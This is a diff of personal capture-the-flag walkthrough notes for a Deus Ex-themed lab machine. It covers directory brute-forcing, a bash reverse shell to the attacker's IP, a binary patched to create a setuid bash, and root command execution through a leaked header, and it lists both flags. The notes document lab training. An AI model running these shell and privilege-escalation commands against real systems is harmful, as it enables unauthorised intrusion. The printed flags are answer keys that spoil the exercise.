@@ -389,3 +389,395 @@ Crunch will now generate the following amount of data: 50000 bytes
 0 PB
 Crunch will now generate the following number of lines: 10000 
 
+crunch: 100% completed generating output
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ gobuster dir -u http://10.10.37.31/datacubes/ -w wordlist2 -t 64 -k -x txt,php,py,html
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.37.31/datacubes/
+[+] Method:                  GET
+[+] Threads:                 64
+[+] Wordlist:                wordlist2
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              py,html,txt,php
+[+] Timeout:                 10s
+===============================================================
+2023/01/13 21:36:53 Starting gobuster in directory enumeration mode
+===============================================================
+/0000                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0000/]
+/0011                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0011/]
+/0068                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0068/]
+/0103                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0103/]
+/0233                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0233/]
+/0451                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0451/]
+Progress: 2836 / 50005 (5.67%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2023/01/13 21:37:03 Finished
+===============================================================
+
+---
+
+using remmina to connect (VNC : 10.10.179.68:5901) and enter pass
+
+open user.txt
+
+From: JManderley//UNATCO.00013.76490
+To: AJacobson//UNATCO.00013.76490
+Subject: re: Security Breach
+
+Thank you for keeping me informed of the recent hacker activity and your speedy
+response to same.  I'm glad our security efforts were up to snuff.
+
+(AJacobson//UNATCO.00013.76490) wrote:
+
+>I managed to stop the guys (actually, it was some French chick
+>the CIA's been watching, perhaps a Silhouette spy(?)) trying to
+>break into the net, but I took the liberty of changing some
+>passwords, just in case.  Here are the new ones:
+>
+> thm{6ae787a98fff512ae33335e1264f0dd3}
+>
+>You should probably delete this as soon as you're done reading, okay?
+
+Microsoft(R) Windows 95
+   (C)Copyright Microsoft Corp 1981-1996.
+```
+```text
+C:\> ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
+boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
+```
+```text
+C:\> cd home
+C:\home> ls
+ajacobson
+C:\home> cd ajacobson/
+C:\home\ajacobson> ls
+Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  Videos
+C:\home\ajacobson> cd Desktop/
+C:\home\ajacobson\Desktop> ls
+badactors-list  user.txt
+C:\home\ajacobson\Desktop> ls -lah
+total 6.7M
+drwxr-xr-x  2 ajacobson ajacobson 4.0K Oct 22 05:36 .
+drwxr-xr-x 20 ajacobson ajacobson 4.0K Jan 14 00:15 ..
+-rwxr-xr-x  1 ajacobson ajacobson 6.7M Oct 22 05:36 badactors-list
+-rw-r--r--  1 ajacobson ajacobson  643 Oct 22 14:08 user.txt
+C:\home\ajacobson\Desktop> file badactors-list 
+badactors-list: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9bf588974cd2b3b7c2db34d49d3df7aec3a76dc, for GNU/Linux 3.2.0, not stripped
+
+revshell
+
+C:\home\ajacobson\Desktop> bash -i >& /dev/tcp/10.8.19.103/1337 0>&1
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ rlwrap nc -lvnp 1337                                     
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.37.31.
+Ncat: Connection from 10.10.37.31:52068.
+
+Microsoft(R) Windows 95
+   (C)Copyright Microsoft Corp 1981-1996.
+
+C:\home\ajacobson\Desktop> python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Microsoft(R) Windows 95
+   (C)Copyright Microsoft Corp 1981-1996.
+
+C:\home\ajacobson\Desktop> 
+zsh: suspended  rlwrap nc -lvnp 1337
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ stty raw -echo; fg
+[1]  + continued  rlwrap nc -lvnp 1337
+C:\home\ajacobson\Desktop> export TERM=xterm-256color
+export TERM=xterm-256color
+
+C:\home\ajacobson\Desktop> python3 -m http.server 8000
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.8.19.103 - - [14/Jan/2023 00:25:17] "GET /badactors-list HTTP/1.1" 200 -
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ wget http://10.10.37.31:8000/badactors-list
+--  http://10.10.37.31:8000/badactors-list
+Connecting to 10.10.37.31:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6941856 (6.6M) [application/octet-stream]
+Saving to: ‘badactors-list’
+
+badactors-list                     100%[==============================================================>]   6.62M  1.22MB/s    in 9.0s    
+
+(752 KB/s) - ‘badactors-list’ saved [6941856/6941856]
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ chmod +x badactors-list
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ ls
+badactors  badactors-list
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ ./badactors-list                  
+Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal
+ Post "http://UNATCO:23023": dial tcp: no such host
+
+adding to /etc/host
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ sudo nano /etc/hosts      
+[sudo] password for kali:
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ tail /etc/hosts
+10.10.11.180 mattermost.shoppy.htb
+10.10.20.190 windcorp.thm
+10.10.148.212 fire.windcorp.thm
+10.10.85.102 selfservice.windcorp.thm
+10.10.85.102 selfservice.dev.windcorp.thm
+10.10.167.117 team.thm
+10.10.167.117 dev.team.thm
+10.10.29.100 set.windcorp.thm
+10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
+10.10.37.31  UNATCO
+
+there's an app (list of badactors)
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ strings badactors-list | less
+
+The `less` command is a command line utility used to view the contents of a text file one page at a time. To search within a file being viewed with `less`, use the forward slash (/) followed by the search term and press enter. To search for the next occurrence of the term, press n. To search for the previous occurrence, press Shift+n. To exit the search and return to normal navigation, press q.
+
+Example:
+
+Copy code
+
+`less file.txt /search_term`
+
+so searching 
+
+/badactor
+
+incoming valuescat /var/www/html/badactors.txtcheckmark found unmarked
+
+/base64
+
+may contain pointersecho %s | base64 -d > /var/www/html/badactors.txt
+
+so let's replace this
+
+base64 -d > /var/www/html/badactors.txt
+
+but first check length
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ python3                    
+Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> len("base64 -d > /var/www/html/badactors.txt")
+39
+
+to
+
+cp /bin/bash /tmp/w  && chmod +s /tmp/w
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ python3
+Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> len("cp /bin/bash /tmp/w  && chmod +s /tmp/w")
+39
+
+now replace it (ctrl + w to search in nano.. search base64 then replace)
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.37.31 - - [13/Jan/2023 19:49:57] "GET /badactors-list HTTP/1.1" 200 -
+
+C:\home\ajacobson\Desktop> cd /tmp
+cd /tmp
+C:\tmp> wget http://10.8.19.103:8000/badactors-list
+wget http://10.8.19.103:8000/badactors-list
+--  http://10.8.19.103:8000/badactors-list
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6941535 (6.6M) [application/octet-stream]
+Saving to: ‘badactors-list’
+
+badactors-list      100%[===================>]   6.62M  1.06MB/s    in 8.4s    
+
+(810 KB/s) - ‘badactors-list’ saved [6941535/6941535]
+
+C:\tmp> chmod 777 badactors-list
+chmod 777 badactors-list
+C:\tmp> ls
+ls
+badactors-list
+pulse-PKdhtXMmr18n
+snap.lxd
+ssh-qoTedSNcOwt2
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-apache2.service-KlE7Yg
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-colord.service-bsowPh
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-ModemManager.service-UxUWkh
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-switcheroo-control.service-wDAsSh
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-systemd-logind.service-DSmuyi
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-systemd-resolved.service-ae84rj
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-systemd-timesyncd.service-KX6o8e
+systemd-private-48215323ef2a41eeab7bfd3cb0740100-upower.service-QRShUg
+
+C:\tmp> ./badactors-list
+./badactors-list
+Segmentation fault (core dumped)
+
+uhmm not work
+
+let's do another method
+
+http://unatco:23023/
+
+UNATCO Liberty Island - Command/Control
+
+RESTRICTED: ANGEL/OA
+
+send a directive to process
+
+using wireshark then curl
+
+start eth0
+```
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ ./badactors-list
+Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal
+
+write a badactor like witty then update
+
+search http and follow tcp
+
+POST / HTTP/1.1
+Host: UNATCO:23023
+User-Agent: Go-http-client/1.1
+Content-Length: 49
+Clearance-Code: 7gFfT74scCgzMqW4EQbu
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txtHTTP/1.1 202 Accepted
+Access-Control-Allow-Origin: *
+Content-Type: text/plain
+Date: Sat, 14 Jan 2023 01:19:48 GMT
+Content-Length: 305
+
+apriest
+aquinas_nz
+cookiecat
+
+Clearance-Code: 7gFfT74scCgzMqW4EQbu
+
+"Clearance-Code" is not a standard HTTP header and its purpose is likely specific to the application or service that the command is communicating with. It may be used as a means of authentication or authorization, where the code included in the header is checked against a database or other source of truth to confirm the client making the request is authorized to do so.
+
+In this context, "directive" is likely a specific key or parameter used to indicate the specific action or command that the client (the user running the cURL command) wants the server to perform. The value "whoami" is passed as the value of the "directive" parameter in the command you provided.
+
+It could be a parameter that tells the server what to do, so it could be different depending on the value passed on it. The value "whoami" is a command that is commonly used to find out the current logged in user name. This parameter is used to instruct the server to process that specific command, this way the developer can have one endpoint to handle multiple commands.
+
+or
+
+Microsoft(R) Windows 95
+   (C)Copyright Microsoft Corp 1981-1996.
+```
+```text
+C:\> export http_proxy=localhost:4444
+```
+```text
+C:\> cd /home
+C:\home> ls
+ajacobson
+C:\home> cd ajacobson/
+C:\home\ajacobson> cd Desktop/
+C:\home\ajacobson\Desktop> ls
+badactors-list  user.txt
+C:\home\ajacobson\Desktop> ./badactors-list 
+Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal
+
+Microsoft(R) Windows 95
+   (C)Copyright Microsoft Corp 1981-1996.
+```
+```text
+C:\> nc -lnvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 127.0.0.1 47596
+POST http://UNATCO:23023/ HTTP/1.1
+Host: UNATCO:23023
+User-Agent: Go-http-client/1.1
+Content-Length: 49
+Clearance-Code: 7gFfT74scCgzMqW4EQbu
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl -XPOST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' -d 'directive=whoami' UNATCO:23023
+root
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl -XPOST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' -d 'directive=cat+/root/root.txt' UNATCO:23023
+
+From: AJacobson//UNATCO.00013.76490
+To: JCDenton//UNATCO.82098.9868
+Subject: Come by my office
+
+We need to talk about that last mission.  In person, not infolink.  Come by my
+office after you've been debriefed by Manderley.
+
+    thm{985bb3c88bfe66f9b465b00198692866}
+
+-alex-
+```
+![[Pasted image 20230113185314.png]]
+![[Pasted image 20230113190605.png]]
+![[Pasted image 20230113190927.png]]
+![[Pasted image 20230113191112.png]]
+![[Pasted image 20230113191815.png]]
+![[Pasted image 20230113192827.png]]
+![[Pasted image 20230113193423.png]]
+![[Pasted image 20230113202113.png]]
+What is the User flag?
+If you get locked out, restart either the target or your attack box for a new IP.
+What is the Root flag?
+### Credits
+The theme used for XFCE is [https://github.com/grassmunk/Chicago95](https://github.com/grassmunk/Chicago95) which is excellent! Thanks to my beta testers (Voy, memN0ps and sootierr). Thanks to [https://nuwen.net/dx.html](https://nuwen.net/dx.html) a compiled Deus Ex text resource by the excellent Stephan T. Lavavej. And thanks to all of you!
+Answer the questions below
+Thanks!
+
+## Flags / Answers
+- ***thm{6ae787a98fff512ae33335e1264f0dd3}***
+- ***thm{985bb3c88bfe66f9b465b00198692866}***
+
+## Notes / Lessons Learned
+[[Brute]]
+
